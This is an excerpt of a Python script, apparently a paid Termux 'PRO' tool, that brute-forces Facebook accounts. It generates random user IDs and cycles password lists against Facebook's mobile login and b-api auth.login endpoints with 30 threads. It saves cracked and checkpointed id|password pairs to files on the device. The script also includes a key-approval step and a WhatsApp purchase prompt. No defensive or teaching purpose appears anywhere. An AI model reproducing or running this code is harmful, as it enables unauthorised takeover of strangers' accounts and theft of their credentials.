##RANI ISE BACK JO BI PANGA LEGA Zonera se YEHI HAAL HOGA 
## NAME TO YAAD HE 🍌✌️
from os import path
...
Pro
  \33[;97m
=======================================================
\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : ZUNERA Khan
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\33[1;97m----------------------------------------------")
      print("\33[1;97mFirst Join ZUNERA Group ")
      print('Copy Key and send ZUNERA Owner')
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923329031938&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi ZUNERA , I Need To Buy Your Paid ZUNERA PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Zunera10.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ZUNERA:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                ZUNERA.submit(rndm,ids,passlist)
                print('\033[1;97m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        LUQMAN=session.cookies.get_dict().keys()
                        if "c_user" in LUQMAN:
                                ...
                                oks.append(ids)
                                break
                        elif 'checkpoint' in LUQMAN:
                                if 'y' in pcp:
                                        print('\r\033[1;97m Zunera-CP '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                head = {
                                        ...
                                        "content-type": 'multipart/form-data; boundary=----WebKitFormBoundaryAqqFaRC9Yo6f1wFs',
                                        "origin": 'https://m.facebook.com',
                                        "referer": 'https://m.facebook.com/?stype=lo&jlou=Afcgbj2hHPZ-6KGKVPNg00z37bqpWDCoK8XcdLCiL61q32f6Z_GniPXwWSyMfk-rq28z3yH5-Danh4pRyHsFwnwFg4TOPW2-9oouWqbLJa6reg&smuh=21062&lh=Ac_O-HckcMDpQnjaN2E&_rdr',
                                        ...
                                        "user-agent": 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1823) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
                                        }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m Zunera-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Zunera-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\033[1;97m LUQMAN-CP '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Zunera-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mZunera-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Zunera-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Zunera-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m Zunera-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Zunera-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mZunera-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Zunera-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
